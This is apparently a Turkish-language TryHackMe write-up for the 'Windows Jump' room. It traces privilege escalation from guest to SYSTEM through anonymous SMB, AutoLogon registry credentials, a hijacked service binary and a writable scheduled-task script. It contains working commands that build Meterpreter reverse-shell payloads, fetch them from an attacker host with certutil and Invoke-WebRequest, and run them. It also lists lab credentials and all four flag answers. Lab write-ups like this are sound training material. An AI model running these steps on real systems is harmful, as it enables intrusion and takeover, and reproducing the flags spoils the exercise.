# Windows Jump — TryHackMe Writeup

> **Yol:** `guest` → `thmuser` → `notadmin` → `svcadmin` → `SYSTEM`

## Giriş

Bu odada senaryo şöyle: bir zafiyet taramasında ağda unutulmuş bir Windows makinesi tespit edilmiş. Ekip küçülmesi sonrası IT tarafından düzgün temizlenmemiş, sıradan bir workstation gibi görünüyor ama içine girince katman katman kötü konfigürasyon çıkıyor. Amacımız `guest` seviyesinden başlayıp `SYSTEM` yetkisine kadar tırmanmak. Aşağıda attığım her adımı, neden o adımı attığımı ve bulduğum şeyleri elimden geldiğince detaylı anlatmaya çalıştım.

---

##  Enumeration

İlk iş her zaman aynı: portları görmek. Klasik agresif Nmap taraması ile başladım:

```bash
nmap -sS -A -p- 10.113.128.72
```
<img width="979" height="757" alt="nmap1" src="https://github.com/user-attachments/assets/a38c86f0-216a-4f54-8c63-5398aeef2d5b" />

Çıktıda dikkatimi çeken portlar:

`rdp-ntlm-info` script çıktısından da makinenin adını ve alan bilgisini öğrendim:

```
Target_Name: PRIVESC
NetBIOS_Domain_Name: PRIVESC
DNS_Domain_Name: privesc
Product_Version: 10.0.17763
```
445 portu açık olduğu için ilk aklıma gelen SMB üzerinden bilgi toplamak oldu. Bunun için **NetExec (nxc)** kullandım:

```bash
nxc smb 10.113.128.72
```
<img width="1365" height="439" alt="smb" src="https://github.com/user-attachments/assets/7d8cd793-ba38-4f98-8108-b9bdbf8ef76b" />

Buradan şunları öğrendim:

- **İşletim Sistemi:** Windows Server 2019 (Build 17763) x64
- **Bilgisayar Adı:** `PRIVESC`
- **Domain/Workgroup:** `privesc`
- **SMB Signing:** Kapalı (`signing: False`) → potansiyel olarak relay saldırılarına açık
- **SMBv1:** Kapalı (`SMBv1: False`)

SMB signing'in kapalı olması ilerideki bir NTLM relay senaryosu için önemli bir detay, not düştüm.

### Anonim SMB Erişimi

SMB signing dışında, önce paylaşılan dizinlere bakmak istedim. Guest/null session ile bağlanmayı denedim:

```bash
smbclient -L //10.113.128.72 -N
```

Listede `Public` adında bir paylaşım dikkatimi çekti. Hemen içine girdim:

```bash
smbclient //10.113.128.72/Public -N
```
<img width="1307" height="292" alt="smb2" src="https://github.com/user-attachments/assets/df8e0eaa-b652-4e5b-9890-22581ebf9b50" />

<img width="867" height="199" alt="smbget" src="https://github.com/user-attachments/assets/95fd6b01-401f-4b47-90c1-9d4adce7a48e" />

İçeride `welcome.txt` diye bir dosya vardı, `get` komutuyla kendi makineme çektim:

```
smb: \> get welcome.txt
```

Dosyanın içeriği tam bir hazine çıktı:

Yeni işe başlayan personel için bırakılmış varsayılan bir kimlik bilgisi...

<img width="433" height="179" alt="welcome txt" src="https://github.com/user-attachments/assets/f267f099-10a6-4e9e-969f-54d4886a121d" />

---

## guest → thmuser

Bulduğum kimlik bilgisini önce doğrulamak için NetExec kullandım:

```bash
nxc smb 10.113.128.72 -u thmuser -p 'Password1!'
```

<img width="1359" height="214" alt="kimlikdoğrulama" src="https://github.com/user-attachments/assets/15e493fd-63c5-4996-894c-e33f3f792002" />

<img width="1292" height="193" alt="kimlikdoğrulama2" src="https://github.com/user-attachments/assets/b8456aad-ec86-4ace-92f2-51f1abb4d389" />

Kimlik bilgileri geçerliydi. RDP portu açık olduğu için direkt masaüstüne bağlanmayı denedim:

```bash
xfreerdp3 /v:10.113.128.72 /u:thmuser /p:'Password1!' /cert:ignore
```


Bağlantı başarılı oldu. `C:\Users\thmuser\Desktop` dizinine gidip ilk flag'i aldım:

**Soru:** What are the contents of `flag1.txt`?

**Cevap:** `THM{5mb_cr3d5_1n_th3_5h4r3}`

<img width="829" height="652" alt="flag1" src="https://github.com/user-attachments/assets/e429e3e9-23bd-476c-a03e-0f47899d07ae" />

---

##  thmuser → notadmin

`thmuser` ile içeri girdikten sonra sistemde manuel olarak biraz gezindim ama elle bir şey bulmak zaman kaybı gibi geldiği için **winPEAS** çalıştırmaya karar verdim. Kendi makinemde küçük bir HTTP sunucusu açıp aracı hedefe indirdim:

```bash
# Attacker makinesinde
python3 -m http.server 8000
```

```powershell
# Hedef makinede (thmuser oturumu)
Invoke-WebRequest http://ATTACKER_IP:8000/winPEASx64.exe -OutFile winpeas.exe
.\winpeas.exe > winpeas.txt
```

<img width="947" height="690" alt="winpeas" src="https://github.com/user-attachments/assets/fee80a3c-beec-4be2-8446-e693da3d0a5c" />


Çıktıyı incelerken **AutoLogon** başlığı altında ilginç bir şey gördüm:

```
Looking for AutoLogon credentials
Some AutoLogon credentials were found
DefaultPassword : P@ssw0rd!
```

winPEAS parolayı bulmuş ama kullanıcı adını göstermemiş. Bunun için doğrudan registry'ye baktım:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

<img width="923" height="602" alt="autologon" src="https://github.com/user-attachments/assets/684a0ee2-53e4-4606-882e-cc4d4dd597fd" />

Yani AutoLogon için kullanılan hesap `notadmin`, parolası da düz metin halinde registry'de duruyormuş.



Bilgileri doğrulamak için yine NetExec kullandım:

```bash
nxc smb 10.113.128.72 -u notadmin -p 'P@ssw0rd!' --shares
```
<img width="1328" height="190" alt="autologonsmbbilgileritest" src="https://github.com/user-attachments/assets/993202c2-7112-416e-b460-c5837ea7a838" />

Doğru çıktı. Zaten RDP oturumum açık olduğu için yeni bir oturum açmak yerine mevcut shell üzerinden `runas` ile `notadmin` context'inde bir komut istemi başlattım:

```cmd
runas /user:notadmin cmd.exe
```
<img width="1009" height="728" alt="notadmin" src="https://github.com/user-attachments/assets/111132dc-f0cd-4934-b916-229e71d42831" />

Ardından:

```cmd
cd C:\Users\notadmin\Desktop
type flag2.txt
```
**Soru:** What are the contents of `flag2.txt`?

**Cevap:** `THM{w1nl0g0n_cr3ds_3xp0s3d}`

<img width="958" height="344" alt="flag2" src="https://github.com/user-attachments/assets/0200e894-db6c-4301-a510-e5798c9c551c" />

---

## notadmin → svcadmin

Odanın adımları zaten en başta `guest → thmuser → notadmin → svcadmin → SYSTEM` şeklinde verilmişti (bunu ilerledikten sonra fark ettim), yani sıradaki hedef `svcadmin` kullanıcısıydı.

Sistemde `svcadmin` adıyla çalışan bir servis olup olmadığına baktım:

```cmd
wmic service get Name,DisplayName,StartName | findstr /i svcadmin
```
<img width="802" height="63" alt="svcadminhizmet" src="https://github.com/user-attachments/assets/9b0f7ecd-0ff6-4289-b976-5f2ce9cb00c2" />

Çıktıda `THMSvc` adında bir servis karşıma çıktı. Servisin detaylarını inceledim:

```cmd
sc qc THMSvc
```
<img width="715" height="224" alt="svcadminhizmeti2" src="https://github.com/user-attachments/assets/0f5ca964-2388-4dc9-a868-063cf536e2d8" />

Servisin `svcadmin` context'inde çalıştığını gördükten sonra, servisin kullandığı dizinin izinlerini kontrol ettim:

```cmd
icacls C:\Windows\THMSvc
```

<img width="553" height="116" alt="svcadminhizmeti3" src="https://github.com/user-attachments/assets/5856e4bb-e74e-467c-9ca3-e91fbff286fa" />

Dizin normal kullanıcılar tarafından **yazılabilir** durumdaydı. Yani servis binary'sini kendi payload'ımla değiştirip servisi yeniden başlattığımda, kod `svcadmin` yetkisiyle çalışacaktı — klasik bir **binary hijacking / weak service permissions** açığı.


### Exploit: Reverse Shell ile svcadmin

Önce Kali/attacker makinemde msfvenom ile bir Meterpreter payload'ı ürettim:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.154.242 \
  LPORT=4444 \
  -f exe \
  -o svc.exe
```
<img width="740" height="206" alt="reversexe" src="https://github.com/user-attachments/assets/9deadd4e-6199-4714-bdd2-5e574c3c4cd9" />

Sonra basit bir HTTP sunucusu açıp dosyayı hedefe ulaştırdım:

```bash
python3 -m http.server 8000
```

Hedef üzerinde `certutil` ile payload'ı indirip servisin binary yoluna yerleştirdim:

```cmd
certutil -urlcache -split -f http://192.168.154.242:8000/svc.exe C:\Windows\THMSvc\reverse.exe
```
<img width="734" height="179" alt="shellsystem32" src="https://github.com/user-attachments/assets/f37445d3-ebb3-46ac-80cd-a3e64a4382d7" />

Bağlantı geldiğinde artık `svcadmin` yetkisindeydim. Masaüstüne gidip flag'i aldım:

```cmd
cd C:\Users\svcadmin\Desktop
type flag3.txt
```

**Soru:** What are the contents of `flag3.txt`?

**Cevap:** `THM{s3rv1c3_b1n4ry_h1j4ck3d}`

<img width="414" height="72" alt="FLAG3" src="https://github.com/user-attachments/assets/1dde1e48-87fd-47ba-971a-86fe4326bc42" />

---

## svcadmin → SYSTEM

Son adım için `svcadmin` yetkisiyle sistemde tekrar gezinmeye başladım. `C:\Windows\Tasks\` dizininde `cleanup.bat` adında bir dosya dikkatimi çekti. İzinlerini kontrol ettiğimde bu dosyanın da yazılabilir olduğunu ve **SYSTEM** yetkisiyle çalışan bir zamanlanmış görev (scheduled task) tarafından tetiklendiğini gördüm. Yani içeriğini değiştirip SYSTEM olarak kod çalıştırabilirdim.

Yine aynı yöntemi izledim — bu sefer payload'ı doğrudan `.bat` dosyası üzerinden tetikleyecektim:

<img width="833" height="349" alt="task" src="https://github.com/user-attachments/assets/d014aa1b-131d-4be2-8a39-2d6c06641e7f" />

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.154.242 LPORT=4444 -f exe -o shell.exe

# HTTP sunucusu
python3 -m http.server 8000
```

Hedef üzerinde payload'ı indirdim:

```cmd
certutil -urlcache -f http://192.168.154.242:8000/shell.exe C:\Windows\Temp\shell.exe
```

Ve `cleanup.bat` dosyasının içeriğini kendi payload'ımı çalıştıracak şekilde değiştirdim:

```cmd
cmd /c "echo C:\Windows\Temp\shell.exe > C:\Windows\Tasks\cleanup.bat"
```
<img width="667" height="201" alt="shellson" src="https://github.com/user-attachments/assets/f2db9ef6-ea94-4875-abd3-d5a58034db91" />

Zamanlanmış görev tetiklendiğinde handler tarafında yeni bir bağlantı düştü — bu sefer **SYSTEM** yetkisiyle:


`C:\` dizini altında son flag'i okuyarak zinciri tamamladım:

```cmd
type C:\flag4.txt
```

**Soru:** What are the contents of `flag4.txt`?

**Cevap:** `THM{t4sk_wr1t3_t0_SYST3M}`

<img width="643" height="59" alt="FLAG4" src="https://github.com/user-attachments/assets/6558c9be-a22b-41d3-8fb3-62d953678ef5" />
